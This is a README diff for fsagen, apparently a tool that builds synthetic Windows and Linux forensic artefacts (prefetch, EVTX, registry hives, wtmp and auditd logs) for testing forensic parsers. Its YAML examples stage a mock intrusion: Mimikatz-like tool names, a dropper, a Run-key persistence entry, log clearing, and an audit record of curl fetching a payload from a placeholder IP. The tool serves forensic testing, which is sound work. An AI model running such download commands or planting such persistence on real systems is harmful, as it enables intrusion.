@@ -77,12 +77,15 @@ is recorded rather than silently dropped.
 - Author content in real files with `content_file`, shared across scenarios with
   `--vars-file`
 - Files a tool can actually parse: PE executables, zip, PNG, JPEG, MP4, docx,
-  PDF, Windows shortcuts (`.lnk`), and Chrome and Firefox history databases.
-  Every one of them is read back in the test suite — by `debug/pe`,
-  `archive/zip`, `image/png`, `image/jpeg`, a box walk, SQLite, Windows' own
-  shell and third-party parsers — and fsagen refuses the formats it cannot
-  build rather than writing random bytes under a name that promises one (see
-  _File formats_)
+  PDF, Windows shortcuts (`.lnk`), Prefetch files, event logs (`.evtx`),
+  registry hives (with Run keys, UserAssist and USB history), Linux login
+  records (`wtmp`, `utmp`, `btmp`) and audit logs, and Chrome and Firefox
+  history databases. Every one of them is read back in the test suite — by
+  `debug/pe`, `archive/zip`, `image/png`, `image/jpeg`, a box walk, SQLite,
+  Windows' own shell, event log reader, registry and decompressor, util-linux
+  and third-party parsers — and fsagen refuses the formats it cannot build
+  rather than writing random bytes under a name that promises one (see _File
+  formats_)
 - Real RFC 5322 email: MIME multipart, threading headers, base64 attachments,
   `.eml` and `.mbox`
 - Real PDFs from Markdown, with full control of document metadata
@@ -374,7 +377,7 @@ YAML with an optional `start` and a sequence of operations:
 | `content_kind` | what invented bytes look like — `text` (the default: base32), `bytes` (uniform random), `zeros`, `pattern` (a counting ramp) or `lorem` (words). It only applies to bytes fsagen invents, so giving it beside `content`, `content_file` or `template` is an error                                                                                                                                                                             |
 | `render`       | run `${...}` substitution over the content. Defaults to `true` for inline `content` and `false` for `content_file`, because scripts and PEM keys contain `${...}` sequences of their own that must survive verbatim                                                                                                                                                                                                                           |
 | `mode`         | octal file permissions, e.g. `"0600"` (default 0644 files, 0755 directories)                                                                                                                                                                                                                                                                                                                                                                  |
-| `format`       | what to build — `raw` (default) or `text` writes the content through; `pdf`, `docx`, `pe`, `zip`, `png`, `jpeg`, `mp4`, `lnk`, `chrome_history` and `firefox_places` build a file of that type. With no `format` and no content of its own, the extension picks one (see _File formats_). For the `email` action, `eml` or `mbox`                                                                                                                    |
+| `format`       | what to build — `raw` (default) or `text` writes the content through; `pdf`, `docx`, `pe`, `zip`, `png`, `jpeg`, `mp4`, `lnk`, `prefetch`, `evtx`, `regf`, `utmp`, `auditd`, `chrome_history` and `firefox_places` build a file of that type. With no `format` and no content of its own, the extension picks one (see _File formats_). For the `email` action, `eml` or `mbox`                                                                                                                    |
 
 **Typed blocks** — each belongs to one `format` or action, and is an error
 beside any other
@@ -386,6 +389,11 @@ beside any other
 | `pe`      | machine, subsystem, dll, timestamp, sections, imports and version resource for `format: pe` — see _File formats_ |
 | `history` | `visits` and (Chrome) `downloads` for `format: chrome_history` or `firefox_places` — see _File formats_          |
 | `lnk`     | the target and what the link records about it, for `format: lnk` — see _`lnk:`_                                  |
+| `prefetch` | the program, its runs and what it loaded, for `format: prefetch` — see _`prefetch:`_                            |
+| `evtx`    | the channel, computer and events, for `format: evtx` — see _`evtx:`_                                              |
+| `registry` | keys, values, Run entries, UserAssist and USB devices, for `format: regf` — see _`registry:`_                   |
+| `utmp`    | login, logout, boot, shutdown and failed-login records, for `format: utmp` — see _`utmp:` and `auditd:`_          |
+| `auditd`  | executions and logins, for `format: auditd` — see _`utmp:` and `auditd:`_                                         |
 | `slack`   | bytes left past the end of the file, in the rest of its last cluster (`create`, `update`) — see _Slack_         |
 | `archive` | what goes into the `archive` action's zip — see _File formats_                                                   |
 | `edit`    | the changes the `edit` action makes — see _File formats_                                                         |
@@ -1050,10 +1058,10 @@ What fsagen does not control, and what can change its output after it finishes:
 - A generated PE is a container for a parser, not a program: its sections hold
   filler, its entry point is inside that filler, and running one does nothing.
   fsagen has no way to produce, and no intention of producing, working code.
-- Not generated at all: registry hives (a `.reg` export is text), EVTX,
-  Prefetch, `$Recycle.Bin`, and disk images. fsagen writes into a directory on a
-  live file system; making a FAT or NTFS image, with `$FILE_NAME` times and
-  deleted-entry residue under fsagen's control, is a separate piece of work.
+- Not generated at all: `$Recycle.Bin`, SRUM, Amcache, ESE databases, and disk
+  images. fsagen writes into a directory on a live file system; making a FAT or
+  NTFS image, with `$FILE_NAME` times and deleted-entry residue under fsagen's
+  control, is a separate piece of work.
 
 ## File formats
 
@@ -1070,6 +1078,11 @@ type whose extension is ambiguous.
 | `mp4`            | `.mp4`                      | `ftyp` + `moov` (`mvhd`, one video `trak`) + `mdat`, 320×240, 3 s                                                    | the `mdat` payload                  | a box walk (`TestMP4HasFtypMoovMdat`, `TestMP4DurationAndDimensions`)    |
 | `docx`           | `.docx`                     | an OOXML package: `[Content_Types].xml`, `word/document.xml`, `docProps/core.xml` and `app.xml`, stored uncompressed | the document's text                 | `archive/zip` + the properties (`TestDocxOpensWithParts`)                |
 | `lnk`            | `.lnk`                      | a Windows shell link: header, ID list down to the target, LinkInfo (volume and path), strings, a link-tracking block  | not accepted                        | Windows' own shell and golnk (see _`lnk:`_)                              |
+| `prefetch`       | `.pf`                       | a Windows 10 or 11 prefetch file (SCCA version 30 or 31), MAM-compressed with XPRESS Huffman                         | not accepted                        | Windows' own decompressor and go-prefetch (see _`prefetch:`_)            |
+| `evtx`           | `.evtx`                     | a Windows event log: file header, 64 KiB chunks, binary XML records with templates, every CRC                        | not accepted                        | `Get-WinEvent` and Velocidex evtx (see _`evtx:`_)                         |
+| `regf`           | `.hve`, and the names `NTUSER.DAT` `USRCLASS.DAT` `SYSTEM` `SOFTWARE` `SAM` `SECURITY` `DEFAULT` | a registry hive, version 1.5                                    | not accepted                        | Windows' own registry and regparser (see _`registry:`_)                  |
+| `utmp`           | the names `utmp` `wtmp` `btmp` | glibc's `struct utmp` records                                                                                     | not accepted                        | util-linux (see _`utmp:` and `auditd:`_)                                 |
+| `auditd`         | the name `audit.log`        | auditd's raw log format                                                                                              | not accepted                        | see _`utmp:` and `auditd:`_                                              |
 | `pdf`            | _(explicit only)_           | a paginated PDF from a Markdown subset                                                                               | the document's text                 | see _`format: pdf`_                                                      |
 | `chrome_history` | _(explicit only)_           | Chrome's `meta`, `urls`, `visits`, `downloads`, `downloads_url_chains` and `keyword_search_terms`, with its indexes  | not accepted                        | SQLite + the queries a tool runs (`TestStandardHistorySQLReturnsVisits`) |
 | `firefox_places` | _(explicit only)_           | Firefox's `moz_origins`, `moz_places` (with `rev_host`) and `moz_historyvisits`, `user_version = 77`                 | not accepted                        | as above                                                                 |
@@ -1077,7 +1090,9 @@ type whose extension is ambiguous.
 
 `.pdf` is deliberately not inferred: a PDF's dates are settled while the
 operation is compiled, before its path is rendered, so it stays an explicit
-`format: pdf`. An extension that promises something fsagen still cannot build is
+`format: pdf`. A hive, a login record and an audit log are known by their
+whole name rather than an extension, and `.dat` alone infers nothing: it names
+plenty of files that are not hives. An extension that promises something fsagen still cannot build is
 an error rather than a fake — see _Input is strict_.
 
 Filler is base32 text unless `content_kind` says otherwise (`TestFillerKinds`,
@@ -1222,6 +1237,202 @@ tool reports where the target was, when, on which volume and on which machine.
   (`TestLNKReadByWindowsShell`); and golnk parses it end to end in the
   conformance suite (`TestLNKReadByGolnk`). Every value the block can give is
   checked before anything is written (`TestLNKBlockRules`).
+
+### `prefetch:` — proof of execution
+
+The prefetch file Windows 10 (SCCA version 30, in the layout Windows 10 1903
+introduced) or Windows 11 (version 31) keeps for a program it has seen start:
+the program's name and path hash, the run count, the last eight run times, the
+files it loaded and the volumes they were on, compressed as Windows compresses
+it, in a `MAM` header with XPRESS Huffman.
+
+```yaml
+- action: create
+  path: Windows/Prefetch/MIMI.EXE-18453749.pf # .pf implies format: prefetch
+  prefetch:
+    executable: 'E:\Tools\mimi.exe' # required
+    version: win11 # win11 (default) or win10
+    run_count: 3 # default: the number of last_run_times
+    last_run_times: # at most 8, any order; default the action's time
+      - "2024-03-15T09:30:00Z"
+      - "2024-03-14T22:10:00Z"
+    referenced_files: # besides the program and ntdll.dll, which are always
+      - 'C:\Windows\System32\advapi32.dll' # listed; default kernel32.dll and
+      - 'E:\Tools\mimilib.dll' # KernelBase.dll
+    harddisk_volume: 3 # N of \Device\HarddiskVolumeN, for the hash; default 3
+    volumes: # serial and format time per drive; default from the seed
+      - { drive: E, serial: 1A2B-3C4D, created: "2024-01-15T12:00:00Z" }
+    compressed: true # default; false writes the SCCA data plain
+```
+
+- The hash is the one Windows computes, over the program's device path in
+  upper-case UTF-16: `TestPrefetchHashMatchesWindows` reproduces the names of two
+  real Windows 10 prefetch files. A file named the way Windows names one
+  (`NAME.EXE-XXXXXXXX.pf`) must match its program and volume, or the scenario
+  is refused (`TestPrefetchBlockRules`); any other name is a renamed copy and
+  is left alone.
+- Each volume is named as Windows names it, `\VOLUME{<creation FILETIME>-<serial>}`,
+  and lists the directories its files are in. File references are left out,
+  as Windows 10 and later leave them out. Fields whose meaning is unknown hold
+  what Windows was seen to write, or zero; the run count is where Windows 10
+  1903 and later keep it, and the field older files kept it in is zero, so
+  every parser reads the same count.
+- The XPRESS Huffman encoder is fsagen's own and deterministic. Windows'
+  `RtlDecompressBufferEx` decodes everything it writes (`TestXpressDecodedByWindows`),
+  as do a decoder written from [MS-XCA] (`TestXpressRoundTrip`) and
+  go-prefetch's own (`TestPrefetchDecompressedByGoPrefetch`). fsagen's reader
+  walks the decompressed file (`TestPrefetchReadBack`), and go-prefetch, the
+  parser Velociraptor uses, reads the program, hash, run count, run times and
+  loaded files for both versions (`TestPrefetchReadByGoPrefetch`).
+
+### `evtx:` — Windows event logs
+
+An event log as Windows writes one: the file header, 64 KiB chunks with their
+string and template tables, and each event as binary XML, a template defined
+once per chunk and filled with the event's values. Every CRC is right.
+
+```yaml
+- action: create
+  path: Windows/System32/winevt/Logs/Security.evtx # .evtx implies format: evtx
+  evtx:
+    channel: Security # default: the built-in events' channel, else Application
+    computer: WS01.corp.example # default: DESKTOP- and 7 characters from the seed
+    first_record_id: 7000 # default 1
+    events:
+      - event_id: 4624 # built in: provider, version, task, keywords and the
+        time: "2024-03-15T08:59:00Z" # names and types of its data are Windows' own
+        data:
+          TargetUserName: alice
+          TargetDomainName: CORP
+          LogonType: 10
+          IpAddress: 203.0.113.7
+      - event_id: 1102 # the log was cleared
+        data: { SubjectUserName: alice }
+      - event_id: 1000 # any other event names its provider; its data are strings
+        provider: Application Error
+        level: 2
+        data: { AppName: dropper.exe }
+```
+
+- Built in: 4624 (an account logged on), 4688 (a process was created), 7045 (a
+  service was installed) and 1102 (the audit log was cleared, written as
+  `UserData` as Windows writes it). A data value left out is the one Windows
+  writes when it has none (`-`, `0x0`, `S-1-0-0`); a name the event does not
+  have, or a value its type cannot hold (a SID, a GUID, a number), is refused
+  (`TestEvtxBlockRules`). A built-in event in a log of another channel is
+  refused too.
+- Each event is one template, where Windows nests the event data in a template
+  of its own; every reader renders the same XML from either. Event times keep
+  100 ns.
+- Windows itself reads the log: `Get-WinEvent -Path` renders every record to
+  exactly the XML the events describe (`TestEvtxReadByWindows`), and reads a
+  log of several chunks whole and in order (`TestEvtxChunksReadByWindows`).
+  fsagen's reader checks every CRC, size and offset and renders the binary XML
+  (`TestEvtxReadBack`, `TestEvtxSpansChunks`), and Velocidex evtx reads every
+  value back (`TestEvtxReadByVelocidex`, `TestEvtxChunksReadByVelocidex`).
+
+### `registry:` — registry hives
+
+A hive as Windows XP SP2 and later save one (version 1.5): the base block, hive
+bins of cells, each key's subkeys in a hash leaf sorted the way Windows looks
+names up (an index of leaves past 512), values inline, in a cell or split into
+big-data segments, and one shared security descriptor. Which hive a file is
+comes from its name, and decides where the artefacts below go.
+
+```yaml
+- action: create
+  path: C/Users/alice/NTUSER.DAT # the name implies format: regf
+  registry:
+    keys:
+      - path: 'Software\Sysinternals\PsExec'
+        last_written: "2024-03-15T09:00:00Z" # default the action's time
+        values:
+          - { name: EulaAccepted, type: REG_DWORD, data: 1 }
+          - { name: "", data: default value } # REG_SZ is the default type
+          - { name: Blob, type: REG_BINARY, data: "de ad be ef" }
+          - { name: Paths, type: REG_MULTI_SZ, strings: [a, b] }
+    run: # NTUSER.DAT or SOFTWARE
+      - { name: SystemUpdate, command: 'C:\Users\alice\AppData\Local\Temp\wupdmgr32.exe' }
+    userassist: # NTUSER.DAT
+      - { path: 'C:\Windows\System32\cmd.exe', run_count: 4, focus_time_ms: 61000, last_run: "2024-03-15T09:30:00Z" }
+- action: create
+  path: C/Windows/System32/config/SYSTEM
+  registry:
+    usbstor: # SYSTEM
+      - vendor: SanDisk
+        product: Cruzer Blade
+        revision: "1.00"
+        serial: 4C530001231117116491
+        first_install: "2024-03-14T08:00:00Z" # first_install and last_arrival
+        last_arrival: "2024-03-15T09:00:00Z" # default to the action's time;
+        last_removal: "2024-03-15T10:00:00Z" # without one it is still connected
+```
+
+- Value types: `REG_SZ`, `REG_EXPAND_SZ`, `REG_MULTI_SZ`, `REG_DWORD`,
+  `REG_DWORD_BIG_ENDIAN`, `REG_QWORD`, `REG_BINARY`, `REG_NONE`.
+- `run` is the Run key of the hive it is in. `userassist` writes Explorer's
+  records under the GUID for programs, or for shortcuts when the path is a
+  `.lnk`: the name ROT13'd with its known folder as a GUID, the 72-byte value
+  with the run count, focus count and time and the last run
+  (`TestUserAssistEncoding`). `usbstor` writes the device's
+  `ControlSet001\Enum\USBSTOR` key with the values the disk driver's
+  installation writes, its install, arrival and removal times as FILETIME device
+  properties, and the `Select` key a parser reads first (`TestUSBStorKeys`). An
+  artefact in a hive that does not keep it is refused (`TestRegistryBlockRules`).
+- Windows' own registry loads the hive, checking it as it does, and reads every
+  key with its last-write time and every value with its type and data
+  (`TestHiveLoadedByWindows`, which loads it as an application hive, as any user
+  may). Big values are split as Windows requires: every segment holds a full
+  16344 bytes, the last one padded. fsagen's reader checks the base block, the
+  bins, the cells, the order and hashes of every leaf (`TestHiveReadBack`), and
+  Velocidex regparser reads the keys and values back
+  (`TestHiveReadByRegparser`).
+
+### `utmp:` and `auditd:` — Linux logins and audit logs
+
+`wtmp`, `utmp` and `btmp` are arrays of glibc's 384-byte `struct utmp`, the
+same on amd64 and arm64. Its times are 32-bit, so nothing after
+2038-01-19T03:14:07Z fits, and such a time is refused.
+
+```yaml
+- action: create
+  path: var/log/wtmp # the names utmp, wtmp and btmp imply format: utmp
+  utmp:
+    records:
+      - { type: boot, time: "2024-03-15T08:00:00Z" } # host: the kernel release
+      - { type: login, user: alice, line: pts/0, host: 203.0.113.7 }
+      - { type: logout, line: pts/0, time: "2024-03-15T10:00:00Z" }
+      - { type: shutdown, time: "2024-03-15T11:00:00Z" }
+- action: create
+  path: var/log/btmp # failed logins only
+  utmp:
+    records:
+      - { type: failed, user: root, host: 203.0.113.7 } # line: ssh:notty
+- action: create
+  path: var/log/audit/audit.log # the name implies format: auditd
+  auditd:
+    events: # each a second after the last, unless timed
+      - { type: auth, user: alice, host: 203.0.113.7 }
+      - { type: login, user: alice, host: 203.0.113.7 }
+      - { type: execve, user: alice, argv: [curl, -o, /tmp/x, 'http://198.51.100.42/p'], key: exec }
+```
+
+- In a playbook a record or event that names no user is the actor's.
+- A login's id is the last four characters of its line, as `login` and `sshd`
+  make it; a logout takes its login's line, id and pid. Unless given, pids come
+  from the seed and a login's session is its pid. util-linux reads the records
+  back, `last` pairing each login with its logout (`TestUtmpReadByUtilLinux`,
+  where `utmpdump` and `last` are installed), and a mirror of the C struct
+  reads every field (`TestUtmpLayout`).
+- An audit log is auditd's raw format. An execution is the kernel's `SYSCALL`
+  record for `execve`, then `EXECVE`, `CWD`, a `PATH` for the program and its
+  loader, and `PROCTITLE`, all with the event's serial. `auth`, `login` and
+  `session_start` are the `USER_AUTH`, `USER_LOGIN` and `USER_START` records PAM
+  and `sshd` write. A string with a space, a quote or anything outside
+  printable ASCII is written as hex, as the kernel writes it
+  (`TestAuditLogLines`). Serials start from the seed and rise. `ausearch` reads
+  the log where it is installed (`TestAuditLogReadByAusearch`); it was not on
+  any machine this was tested on.
 
 ### `archive` action
 
@@ -1496,10 +1707,13 @@ against someone else's reading of its specification too. It is a separate
 module (`go -C internal/conformance test ./...`, run by the gate), so none of
 these is a dependency of fsagen and none is in its `go.mod`:
 
-| Module                             | Reads                                                            | Licence    |
-| ---------------------------------- | ---------------------------------------------------------------- | ---------- |
-| `github.com/parsiya/golnk`          | `lnk`                                                                | Apache-2.0 |
-| `www.velocidex.com/golang/go-ntfs` | a live NTFS volume, raw, to read slack back (administrator only) | Apache-2.0 |
+| Module                                 | Reads                                                            | Licence    |
+| -------------------------------------- | ---------------------------------------------------------------- | ---------- |
+| `github.com/parsiya/golnk`             | `lnk`                                                            | Apache-2.0 |
+| `www.velocidex.com/golang/go-prefetch` | `prefetch`, and XPRESS Huffman with its own decoder              | Apache-2.0 |
+| `www.velocidex.com/golang/evtx`        | `evtx`                                                           | Apache-2.0 |
+| `www.velocidex.com/golang/regparser`   | `regf`                                                           | Apache-2.0 |
+| `www.velocidex.com/golang/go-ntfs`     | a live NTFS volume, raw, to read slack back (administrator only) | Apache-2.0 |
 
 ## Citation
 
